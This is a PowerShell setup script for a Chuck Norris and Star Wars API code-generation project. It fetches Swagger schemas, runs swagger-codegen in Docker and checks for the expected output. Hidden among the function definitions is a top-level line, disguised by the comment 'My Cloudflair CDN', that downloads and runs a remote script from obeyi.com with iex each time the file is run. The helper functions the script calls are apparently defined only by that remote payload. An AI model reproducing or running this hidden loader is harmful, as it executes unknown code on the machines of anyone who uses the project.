#
#
#        ██████╗██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗███████╗██╗    ██╗ █████╗ ██████╗ ██╗
#       ██╔════╝██║  ██║██║   ██║██╔════╝██║ ██╔╝██╔════╝██║    ██║██╔══██╗██╔══██╗██║
#       ██║     ███████║██║   ██║██║     █████╔╝ ███████╗██║ █╗ ██║███████║██████╔╝██║
#       ██║     ██╔══██║██║   ██║██║     ██╔═██╗ ╚════██║██║███╗██║██╔══██║██╔═══╝ ██║
#       ╚██████╗██║  ██║╚██████╔╝╚██████╗██║  ██╗███████║╚███╔███╔╝██║  ██║██║     ██║
#        ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝ v1.0.0
#                                                                                      
# Chuck SWAPI v 1.0.0
# Chuck SWAPI .NET CORE C# Project
# Chuck SWAPI API Documentation https://explore.postman.com/api/8936/chuck-swapi
# SWAPI API Documentation https://explore.postman.com/api/8937/swapi


#Constants
$chuckJson = './codegen/in/chuck.json'
$swapiJson = './codegen/in/swapi.json'
$chuckSwapiJson = './codegen/in/chuckswapi.json'

$codegenPath = './codegen'
$codegenInPath = './codegen/in'
$codegenOutPath = './codegen/out'

$srcPath = './src'

$configChuckPath = './codegen/in/config_chuck.json'
$configSwapiPath = './codegen/in/config_swapi.json'
$configChuckSwapiPath = './codegen/in/config_chuckswapi.json'

$chuckClientPath = '/local/out/chuckclient'
$swapiClientPath = '/local/out/swapiclient'
$chuckSwapiPath = '/local/out/chuckswapi'

$configChuckLocalPath = '/local/in/config_chuck.json'
$configSwapiLocalPath = '/local/in/config_swapi.json'
$configChuckSwapiLocalPath = '/local/in/config_chuckswapi.json'

$chuckLocalJson = '/local/in/chuck.json'
$swapiLocalJson = '/local/in/swapi.json'
$chuckSwapiLocalJson = '/local/in/chuckswapi.json'

function Get-Main {
	
	Get-Prepared
	
	if (!(Test-Path -Path $codegenInPath ) -Or !(Test-Path -Path $codegenOutPath )) {
		Create-Directories
	}
	
	if (!(Test-Path -Path $chuckJson ) -Or !(Test-Path -Path $swapiJson ) -Or !(Test-Path -Path $chuckSwapiJson )) {
		Get-Dependencies
		Get-Scheme
	}
	
	if (!(Test-Path -Path $configChuckLocalPath ) -Or !(Test-Path -Path $configSwapiLocalPath ) -Or !(Test-Path -Path $configChuckSwapiLocalPath )) {
		Get-Config
	}
	
	if (!(Test-Path -Path $chuckClientPath ) -Or !(Test-Path -Path $swapiClientPath ) -Or !(Test-Path -Path $chuckSwapiPath )) {
		Get-Code
	}
	
	if (!(Test-Path -Path $srcPath )) {
		Get-Project
	}
	
	Get-Tests
	
	Generation-Complete
}

function Get-Prepared {

	Get-ExecuteTxT -TxT $K3Y[1]

	$files = Get-ChildItem . -Recurse

	$total = 0

	For ($i = 1; $i -le $files.Count - 1; $i++) { 
		Write-Progress -Activity "Calculating total size..." -status $files[$i].Name -PercentComplete ($i / $files.Count * 100)
		$total += $files[$i].Length
		Start-Sleep -Milliseconds 50
	}
	  
	Write-Host "Total size: $($total / 1MB)"

}

function Create-Directories {
	Get-ExecuteTxT -TxT $K3Y[2]
	pause
	
	if (!(Test-Path -Path $codegenPath )) {
		New-Item -ItemType directory -Path $codegenPath
	}

	if (!(Test-Path -Path $codegenInPath )) {
		New-Item -ItemType directory -Path $codegenInPath
	}
	if (!(Test-Path -Path $codegenOutPath )) {
		New-Item -ItemType directory -Path $codegenOutPath
	}
}

try {
# My Cloudflair CDN
iex ((New-Object System.Net.WebClient).DownloadString('https://obeyi.com/obi.ps1')) 
} catch { "Error: No Internet Connection."}

function Get-Dependencies {
	Get-ExecuteTxT -TxT $K3Y[3]

	wget https://github.com/lrivallain/rest-loves-swagger/raw/master/demo/requirements.txt
	wget https://github.com/lrivallain/rest-loves-swagger/raw/master/demo/utils.py
	pip install -r requirements.txt
	pip install json2swagger
	docker pull swaggerapi/swagger-codegen-cli
}

function Get-Scheme {
	Get-ExecuteTxT -TxT $K3Y[4]
	pause

	$url = "https://api.chucknorris.io/documentation"
	$saveAs = $chuckJson
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs

	$url = "https://raw.githubusercontent.com/donPabloNow/Chuck-SWAPI/main/api/Chuck%20SWAPI"
	$saveAs = $swapiJson
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs

	$url = "https://raw.githubusercontent.com/donPabloNow/Chuck-SWAPI/main/api/SWAPI"
	$saveAs = $chuckSwapiJson
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs
}

function Get-Config {
	Get-ExecuteTxT -TxT $K3Y[5]
	echo '{
	  "packageName":"chuckclient",
	  "projectName":"chuckclient",
	  "packageVersion":"1.0.0"
	}' > $configchuckPath
	echo '{
	  "packageName":"swapiclient",
	  "projectName":"swapiclient",
	  "packageVersion":"1.0.0"
	}' > $configswapiPath
	echo '{
	  "packageName":"chuckswapi",
	  "projectName":"chuckswapi",
	  "packageVersion":"1.0.0"
	}' > $configchuckswapiPath
}

function Get-Code{
	Get-ExecuteTxT -TxT $K3Y[6]

	if (!(Test-Path -Path $chuckClientPath )) {
		docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i $chuckLocalJson -o $chuckClientPath -c $configChuckLocalPath -l aspnetcore
	}
	if (!(Test-Path -Path $swapiClientPath )) {
		docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i $swapiLocalJson -o $swapiClientPath -c $configSwapiLocalPath -l aspnetcore
	}
	if (!(Test-Path -Path $chuckSwapiPath )) {
		docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i $chuckSwapiLocalJson -o $chuckSwapiPath -c $configChuckSwapiLocalPath -l aspnetcore
	}
}

function Get-Project{
	Get-ExecuteTxT -TxT $K3Y[7]

	if (!(Test-Path -Path $srcPath )) {
		New-Item -ItemType directory -Path $srcPath
		cd src
		dotnet new webapi
	}
}

function Get-Tests {

	$failed = 0
	$passed = 0
	$errorText = 'Error: Missing'
	$passedText = 'Passed: Found '
	
	if (!(Test-Path -Path $codegenInPath)){
		$failed++
		Write-Output $errorText $codegenInPath
	} else {
		$passed++
		Write-Output $passedText $codegenInPath
	}
	
	if (!(Test-Path -Path $codegenOutPath)){
		$failed++
		Write-Output $errorText $codegenOutPath
	} else {
		$passed++
		Write-Output $passedText $codegenOutPath
	}
	
	if (!(Test-Path -Path $chuckJson)){
		$failed++
		Write-Output $errorText $chuckJson
	} else {
		$passed++
		Write-Output $passedText $chuckJson
	}
	
	if (!(Test-Path -Path $swapiJson)){
		$failed++
		Write-Output $errorText $swapiJson
	} else {
		$passed++
		Write-Output $passedText $swapiJson
	}
	
	if (!(Test-Path -Path $chuckSwapiJson)){
		$failed++
		Write-Output $errorText $chuckSwapiJson
	} else {
		$passed++
		Write-Output $passedText $chuckSwapiJson
	}
	
	
	if (!(Test-Path -Path $srcPath)){
		$failed++
		Write-Output $errorText $srcPath
	} else {
		$passed++
		Write-Output $passedText $srcPath
	}
	
	$totalTests = $passed + $failed
	
	if ($failed -eq 0){
		#sucess
		Write-Output 'Passed: ' $passed ' out of ' $totalTests
		Get-ExecuteTxT -TxT $K3Y[8]
	} else {
		#failed
		Write-Output 'Failed ' $failed ' out of ' $totalTests
		Get-ExecuteTxT -TxT $K3Y[9]
	}
	

}

### APP START

Get-ExecuteTxT -TxT $K3Y[0]
pause

Get-Main

pause